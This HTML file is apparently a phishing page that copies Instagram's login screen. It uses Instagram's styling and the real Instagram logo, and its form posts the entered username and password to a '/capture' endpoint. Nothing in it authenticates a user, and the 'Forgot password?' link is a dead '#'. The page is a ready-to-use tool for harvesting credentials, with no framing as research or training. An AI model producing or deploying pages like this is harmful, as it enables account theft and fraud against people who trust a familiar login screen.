

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 9px 7px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
        }
        button {
            width: 100%;
            padding: 7px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .separator::before, .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .separator span {
            padding: 0 10px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Instagram Logo -->
        <img src="https://www.instagram.com/static/images/logos/logo-instagram.png/351738d4c7b5/" alt="Instagram" class="logo">
        
        <form action="/capture" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        
        <div class="separator"><span>OR</span></div>
        <p><a href="#" style="color: #00376b; text-decoration: none; font-size: 14px;">Forgot password?</a></p>
    </div>
</body>
</html>
